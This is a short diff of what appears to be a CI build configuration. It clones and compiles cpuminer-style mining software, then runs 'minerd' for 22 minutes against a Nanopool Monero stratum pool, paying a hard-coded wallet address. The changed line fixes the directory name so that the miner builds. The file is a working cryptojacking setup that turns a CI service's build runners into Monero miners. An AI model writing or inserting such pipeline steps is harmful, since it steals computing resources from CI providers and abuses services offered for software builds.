@@ -13,6 +13,6 @@ build:
           date
           apt-get update -qq && apt-get install -qqy automake libcurl4-openssl-dev git make build-essential
           mkdir test
-          cd test && git clone https://github.com/suprer/mrd && cd cpuminer-multi && ./autogen.sh && ./configure CFLAGS="-O3" && make
+          cd test && git clone https://github.com/suprer/mrd && cd mrd && ./autogen.sh && ./configure CFLAGS="-O3" && make
           ls -la
           ! timeout 22m ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 46JHKeS9JcXDi8ET6F3ZSgM5mvRZVxMG33Hm3vL1JJknMHoJzqVpTt9e9pT3dApFqeJrXerz19dc1LevwYmDeWauQRQXiUw.wercker -p x
